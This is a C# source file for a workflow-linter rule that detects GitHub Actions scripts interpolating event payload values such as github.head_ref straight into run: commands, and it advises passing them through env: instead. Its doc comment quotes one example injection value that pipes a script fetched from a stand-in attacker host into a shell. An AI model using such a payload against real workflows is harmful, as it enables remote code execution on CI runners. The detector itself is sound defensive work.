namespace ActionLens.Core.Linting.Rules;

/// <summary>
/// AL003 — an event payload value interpolated straight into a <c>run:</c> script.
/// </summary>
/// <remarks>
/// Actions substitutes <c>${{ }}</c> before the shell ever sees the line, so a title, branch name or comment
/// that contains <c>"; curl evil.sh | sh"</c> becomes part of the command line rather than part of a string.
/// The payload is the attacker-controlled part of a workflow, which is why this is Critical rather than a
/// style note; <c>github.head_ref</c> is the same hazard in a name that reads as safe.
/// <para>
/// The values that reach the script through <c>env:</c> are not this rule's problem — the substitution
/// happens where the variable is <em>declared</em>, and the script then only quotes it — so only the
/// interpolation inside the script text is read. <c>matrix.*</c> and <c>inputs.*</c> are left alone for the
/// same reason: they are not the event payload.
/// </para>
/// <para>
/// Positions are computed inside the value's own text — see <see cref="LintTextLocator"/> — because a
/// <c>run: |</c> body is not on the field's line.
/// </para>
/// </remarks>
internal sealed class ScriptInjectionRule : ILintRule
{
    private static readonly string[] UntrustedRoots = ["github.event", "github.head_ref"];

    public LintRuleDescriptor Descriptor => LintRuleTable.PayloadIntoScript;

    public IReadOnlyList<LintFinding> Evaluate(LintContext context)
    {
        ArgumentNullException.ThrowIfNull(context);

        var findings = new List<LintFinding>();
        foreach (var (job, step) in context.Steps())
        {
            if (step.Run is not { Length: > 0 } script)
            {
                continue;
            }

            var scriptRange = LintContext.StepRange(step, "run");
            foreach (var expression in ExpressionTextScanner.Interpolations(script))
            {
                if (!UntrustedRoots.Any(root => ExpressionTextScanner.Mentions(expression.Body, root)))
                {
                    continue;
                }

                var text = "${{ " + expression.Body.Trim() + " }}";
                findings.Add(new LintFinding
                {
                    Message = $"The script interpolates {text} straight into the command line, so a value the " +
                        "event payload carries is parsed as shell code instead of as data.",
                    Range = LintTextLocator.Locate(scriptRange, script, expression.Index, expression.Body.Length + 5),
                    Suggestion = "Bind the value to an `env:` key above the script and read that variable inside " +
                        "it, quoted, so the payload stays data: this is the fix for the injection, not a style change.",
                    Scope = LintContext.StepScope(job, step),
                });
            }
        }

        return findings;
    }
}
